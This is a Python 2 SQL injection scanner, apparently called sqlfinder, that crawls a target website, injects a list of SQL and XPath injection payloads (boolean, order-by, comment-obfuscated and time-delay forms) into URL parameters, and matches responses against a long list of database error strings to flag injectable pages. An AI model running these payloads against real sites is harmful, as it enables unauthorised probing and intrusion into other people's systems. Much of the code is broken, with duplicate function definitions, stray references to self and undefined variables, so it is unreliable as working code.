#!/usr/bin/env python
#coding=utf-8
"""
for help http://www.yzqy.cc
主要模块,调动其他模块进行工作
"""


import os,sys
import threading
from bs4 import BeautifulSoup
import re
import requests
import time
from multiprocessing import Process,Queue



url_1=Queue(maxsize = 1)
url_2=Queue(maxsize = 1)

#下面是程序配置参数
threads=5
timeout=10
deep=5
flag = 0
rule=r'[a-zA-z]+://[\w-]*[\.]?[\w]+\.[a-zA-Z]+'

payload = [	
				"'",
				"2 and 456=678",
				"2 or 345=345",
				"2 order by 9999",
				"2 order by 1",
				"2/0 and 456=678",
				"2/1 or 345=345",
				"2/*f*/and/*f*/456=678",
				"2/*f*/or/*f*/345=345",
				"%27",
				"a' aNd '456'='678",
				"a' oR '345'='345",
				"a' aNd 'fghi'='fghj'-- #",
				"a' Or 'dfth'='dfth'-- #",
				"a' oRdEr by 9999-- #",
				"a' orDeR by 1-- #",
				"a'aNd/*g*/456=678-- #",
				"a'Or/*g*/345=345-- #",
				"345'%5d|//*|/a%5b'a",
				"456'%5d|//a|/a%5b'a",
				"345')%5d|//*|/a%5bcontaiNs(a,'b",
				"456')%5d|//a|/a%5bcontAins(a,'b",
				"a'||/**/456=678#",
				"1/*f*/oR/*f*/888/*f*/lIke/*f*/456",
				"345'||'1",
				"a'or%0a345%0alIKe%0a345-- #",
				"1 waitfor delay '0:0:X'--",
				"1; waitfor delay '0:0:X'--",
				"1'; waitfor delay '0:0:X'--"
			]
error_ban = [
				"ORA",
				"Unclosed.quotation",
				"SQL.syntax",
				"Active.Server",
				"Microsoft Access",
				"database error",
				"ADODB.Field",
				"An.illegal",
				"An.unexpected",
				"ASP.NET.is.configured.to.show.verbose.error.messages",
				"ASP.NET_SessionId",
				"A.syntax",
				"Can't.connect",
				"CLI.Driver",
				"Custom.Error",
				"data.source",
				"DB2.Driver",
				"DB2.Error",
				"DB2.ODBC",
				"detected.an",
				"Died.at",
				"Disallowed.Parent",
				"Error.converting",
				"Error.Diagnostic",
				"Error.Message",
				"Error.Report",
				"Fatal.error",
				"include_path",
				"Incorrect.syntax"
				"Index.of",
				"Internal.Server",
				"Invalid.Path",
				"Invalid.procedure",
				"invalid.query",
				"Invision.Power",
				"is.not.allowed.to.access",
				"JDBC.Driver",
				"JDBC.Error",
				"JDBC.MySQL",
				"JDBC.Oracle",
				"JDBC.SQL",
				"Microsoft.OLE",
				"Microsoft.VBScript",
				"missing.expression",
				"MySQL.Driver",
				"mysql.erro",
				"mySQL.error",
				"MySQL.Error",
				"MySQL.ODBC",
				"ODBC.DB2",
				"ODBC.Driver",
				"ODBC.Error",
				"ODBC.Microsoft",
				"ODBC.Oracle",
				"ODBC.SQL",
				"OLE/DB.provider",
				"on.MySQL",
				"ORA-0",
				"ORA-1",
				"Oracle.DB2",
				"Oracle.Driver",
				"Oracle.Error",
				"Oracle.ODBC",
				"Parent.Directory",
				"Permission.denied",
				"PHP.Error",
				"PHP.Parse",
				"PHP.Warning",
				"PostgreSQL.query",
				"server.at",
				"server.object",
				"SQL.command",
				"SQLException",
				"SQL.Server",
				"supplied.argument",
				"Supplied.argument",
				"Syntax.error",
				"The.error.occurred.in",
				"The.script.whose.uid.is",
				"Type.mismatch",
				"Unable.to.jump.to.row",
				"Unclosed.quotation",
				"unexpected.end",
				"Unterminated.string",
				"Warning..Cannot",
				"Warning..mysql_query",
				"Warning..pg_connect",
				"Warning..Supplied",
				"You.have.an.error.in.your.SQL.syntax",
				"invalid.in.the.select.list.because",
				"数据库出错",
				"数据库错误"
				]


def banner():
	try:
		os.system("cls")
	except:
		os.system('clear')
	print'''
[+] #######   #######   #          
[+] #         #     #   #         ###  ###  ###    #
[+] #######   #     #   #         #     #   # #  ###
[+]       #   #######   #         ###   #   # #  # #
[+] #######         #   #######   #    ###  # #  ###  V1.0
[+]_________________________________________________________
[+][BY :YZQYCN]                          http://www.yzqy.cc
'''

def helper():
	print "[+]Usage: python sqlfinder.py  http://www.google.com/"

	

def argv_do():
	if len(sys.argv)<2:
		helper()
		os._exit(0)
	else:
		'''if sys.argv[1]=="-o":
			write=1'''
		return sys.argv[-1]



def opener():
	global flag
	global deep
	global timeout
	global url_2
	global url_1
	print "[*]Queue size",url_1.qsize()
	while True:
		'''通过传入的方法来请求网页'''
		item=url_1.get()
		method = item[0]
		url = item[1]
		data = item[2]
		url_2.put((method,url,data))
		print "[*]Get ",url
		if method =="get":
			try:	
				fopen=requests.get(url,timeout=timeout)
				self.body=fopen.content
				self.bodysize=len(self.body)
				self.status=fopen.status_code
				print "[*]Currenting open: "+fopen.url
				if self.status!=404:
					self.spider()
			except Exception, e:
				print e 
				return self.opener(q)
		elif method=='post':
			data={}
			fopen=requests.post(url,data,timeout=times)
		else:
			pass


def spider(body):
	global url_1
	soup = BeautifulSoup(body,"html.parser")
	links = soup.find_all('a')
	print "[*]Links :",len(links)
	print "[*]url_1 size :",url_1.qsize()
	for i in links:
		link=i.get('href')
		print link
		if "http" not in link:
			link = rooturl+link
		url_1.put(('get',link,""))
	print "[*]spider start.."


def opener(payurl,method):
	'''通过传入的方法来请求网页'''
	global timeout
	if method =="get":
		try:	
			fopen=requests.get(payurl,timeout=timeout)
			body=fopen.content
			bodysize=len(body)
			status=fopen.status_code
			return body,bodysize,status
		except Exception, e:
			print e 
			body,bodysize,status=0,0,0
			return body,bodysize,status
	elif method=='post':
		data={}
		fopen=requests.post(url,data,timeout=times)
	else:
		pass

def urlsplit(url,payload):
	s=""
	if '&' not in url:
		s=url + "a ' --"
	else:
		url_split_1 = url.split('&')
		#将参数以&切片形成列表
		url_split_2 = map(lambda x:x +payload,url_split_1)
		#将列表中的每个参数都加上payload
		for i in url_split_2:
			s= s +"&" + i
			#再将参数合并成一个完整的url
		return s

def httpthread(payurl,method):
	global timeout
	#此方法用于检测页面是否包含数据库错误信息,从而判断是否是注入点
	body,bodysize,status = opener(payurl,method)
	if (status != 404) or (status != 0):
		for i in self.error_ban:
			if i in bodysize:
				print  "[*]Is true : " + payurl
	else:
		print "[*]Error status : ",status
	return row

def sqltest():
	global url_2
	print "[*]Sqltest thread start.."
	while True:
		item = url_2.get()
		print "sqltest iterm size",url_2.qsize()
		url = item[1]
		method =item[0]
		#多线程操作方法
		for x in payload:
			payurl = urlsplit(url,x)
			while  threading.active_count() < thread:
				test=threading.Thread(target=httpthread,args=([payurl,method,]))
				test.start()




def main():
	#write=0
	banner()
	#初始化
	global rooturl
	rooturl=argv_do()
	print "[*]Current web:",rooturl
	url_1.put(('get',rooturl,''))

	#参数处理
	p1=Process(target=opener)
	p2=Process(target=sqltest)
	p1.start()
	print "[*]Spider process start.."
	p2.start()
	print "[*]Sqltest process start.."



if __name__ == '__main__':
	try:
		main()
	except Exception,e:
		print e
		print "[*]Exit.."
		os._exit(0)



